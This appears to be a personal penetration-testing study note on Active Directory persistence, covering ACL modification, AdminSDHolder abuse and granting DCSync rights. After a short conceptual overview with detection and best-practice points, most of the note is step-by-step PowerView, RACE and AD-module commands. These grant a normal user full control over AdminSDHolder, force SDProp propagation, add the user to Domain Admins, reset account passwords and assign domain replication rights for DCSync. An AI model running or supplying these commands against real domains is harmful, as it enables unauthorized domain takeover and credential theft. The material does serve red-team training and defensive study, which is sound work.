
The **ACL (Access Control List) Modify** persistence technique involves altering the permissions of files, directories, or registry objects to maintain unauthorized access or control over a system. By modifying ACLs, an attacker can grant themselves or a malicious process the ability to read, write, or execute restricted resources, ensuring persistence even after other security measures are applied.

### Key Points:

- **Access Control Lists**: ACLs define which users or processes have permissions (read, write, execute) for system resources.
- **Persistence**: Attackers use this technique to ensure their access remains intact by modifying permissions to prevent legitimate users or security software from removing or interfering with malicious artifacts.
- **Example Use**: Granting "Full Control" to a malicious user for sensitive registry keys or files to execute malware upon system startup.
- **Detection**: Unusual changes to ACLs can be identified through security audits or monitoring tools that track permission changes.

This method is often used in advanced persistent threat (APT) scenarios to bypass normal access restrictions and remain hidden.

![[Pasted image 20241225163942.png]]

![[Pasted image 20241225204850.png]]


**AdminSDHolder** is a special object in Active Directory (AD) designed to enforce consistent and secure permissions for highly privileged accounts and groups in a domain. It helps protect sensitive accounts from accidental or intentional changes to their permissions. SDPROP Compare AdminSDHolder ACL with Members and Protected Groups and overwrite them

---


![[Pasted image 20241225210018.png]]

### Key Details:

1. **What is AdminSDHolder?**
    - it is a Admin Security Descriptor Holder 
    - It is a container object in the **System** container of a domain (`CN=AdminSDHolder,CN=System,<Domain DN>`).
    - It contains a pre-defined **Access Control List (ACL)** that defines the standard permissions for protected accounts and groups.
2. **Protected Accounts and Groups**:
    
    - AdminSDHolder is associated with privileged accounts and groups, such as:
        - **Domain Admins**
        - **Enterprise Admins**
        - **Schema Admins**
        - **Administrators**
        - Accounts with **adminCount=1** (a special attribute set on accounts flagged as privileged).
    - Any account or group considered privileged will inherit permissions from the AdminSDHolder object.
3. **Security Descriptor Propagation**:
    
    - The **SDProp (Security Descriptor Propagation)** process runs every 60 minutes (by default) and:
        - Copies the ACL from the AdminSDHolder object.
        - Applies it to all protected accounts and groups.
    - This ensures consistent and secure permissions for privileged accounts.
4. **Purpose**:
    
    - Protects against accidental or unauthorized changes to ACLs of critical accounts/groups.
    - Prevents custom permissions from being applied to privileged accounts unless explicitly allowed by AdminSDHolder.
5. **Key Considerations**:
    
    - **Custom ACLs**: If you modify permissions directly on a protected account or group, they will be overwritten during the next SDProp process unless the changes are also applied to the AdminSDHolder object.
    - **Monitoring**: Changes to the AdminSDHolder object can have a significant impact on the domain's security posture and should be carefully monitored.
6. **Location**:
    
    - Found under:  
        `CN=AdminSDHolder,CN=System,DC=domain,DC=com`
7. **Best Practices**:
    
    - Avoid unnecessary modifications to the AdminSDHolder ACL.
    - Use it only for legitimate security requirements.
    - Regularly audit permissions on this object and privileged accounts.

---

### ATTck Technique Surface:

- Admin Security Descriptor Holder (AdminSDHolder) Persistence 
- Modify DACL

#### AdminSDHolder ATTck

Privilege Required : Domain Admin

##### Full privilege Assign to User
`PowerSploit (PowerView)`

`PS > Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=adolf,dc=local' -PrincipalIdentity NormalUserNameonDomain -Rights All -PrincipalDomain adolf.local -TargetDomain adolf.local -verbose

##### Special Privilege Assign To Normal User 

**reset Password Option**
`PS > Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=adolf,dc=local' -PrincipalIdentity username -Rights ResetPassword -PrincipalDomain adolf.local -TargetDomain adolf.local -verbose

**add member Option**
`PS > Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=adolf,dc=local' -PrincipalIdentity username -Rights WriteMembers -PrincipalDomain adolf.local -TargetDomain adolf.local -Verbose

resource : https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/

Using Active Directory Module and RACE Toolkit

`Set-DCPermissions -Method AdminSDHolder -SAMAccountName normalUserNameonDomain -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=Adolf,DC=local' -Verbose

resource : https://github.com/samratashok/RACE

this modification can do with GUI

![[Pasted image 20241225213949.png]]


Step 2 : Overwrite This policy with this command 
`PSRemoting`
`PS > $Session = New-PSsession -ComputerName DomainComputer
`PS > icm -Session $Session -FilePath C:\Users\Public\Invoke-SDPropagator.ps1
`PS > icm -ScriptBlock{Invoke-SDPropagator -ShowProgress -Verbose -TimeOutMinutes 1} -Session $Session`

Step 3 : you can Check the Normal User Permission 
`PowerSploit (Powerview)
`PS > Get-DomainObjectACL -Identity 'Domain Admins' -ResolveGUIDs | % {$_ | Add-Member Noteproperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -Match "CNA"}

Step 4 : we can do so much 
**POWERVIEW**
*example 1*
if user have access to add member or full control
`PS > Add-DomainGroupMember -Identity 'Domain Admins' -Members cna -Verbose
if u have permission u can reset password of user

*example 2*
`PS > Set-DomainUserPassword -Identity cna -AccountPassword (ConvertTo-SecurityString "password122" -AsPlainText -Force) -Verbose

**AD MODULE**

`PS > Set-ADAccountPassword -Identity cna -NewPassword (ConvertTo-SecurityString "password122" -AsPlainText -Force) -Verbose
#### Modify DACL

![[Pasted image 20241225182553.png]]

if we can add normal user to this section and give the special privilege . it's can use dcsync attack . unfortunately this log with event code 4662 and this  object not protected by ADMINSDHOLDER

#### **Permission Needed ATTck**
It is known that the below permissions can be abused to sync credentials from a Domain Controller: by default domain admin privilege needed

- The “[**DS-Replication-Get-Changes**](https://msdn.microsoft.com/en-us/library/ms684354(v=vs.85).aspx)” extended right
	- **CN:** DS-Replication-Get-Changes
	- **GUID:** 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
- The “[**Replicating Directory Changes All**](https://msdn.microsoft.com/en-us/library/ms684355(v=vs.85).aspx)” extended right
    - **CN:** DS-Replication-Get-Changes-All
    - **GUID:** 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
- The “[**Replicating Directory Changes In Filtered Set**](https://msdn.microsoft.com/en-us/library/hh338663(v=vs.85).aspx)” extended right (this one isn’t always needed but we can add it just in case :)
    - **CN:** DS-Replication-Get-Changes-In-Filtered-Set
    - **GUID:** 89e95b76-444d-4c62-991a-0facbeda640c

Step 1 : Check the CurrentUserPermission to access Generic All or Replication-get
`PS > Get-DomainObjectAcl -SearchBase "DC=adolf,DC=local" -SearchScope Base -ResolveGUIDs | ?{($_.ObjectAceType -Match 'replication-get') -or ($_.ActiveDirectoryRights -Match 'GenericAll')} | % {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -Match "cna"}

Step 2 : Set Permission to normal User ability dcsync

*DCsync Option*`PS > Add-DomainObjectAcl -TargetIdentity 'dc=domain,dc=local' -PrincipalIdentity Normalusername -Rights DCSync -PrincipalDomain adolf.local -TargetDomain adolf.local -verbose 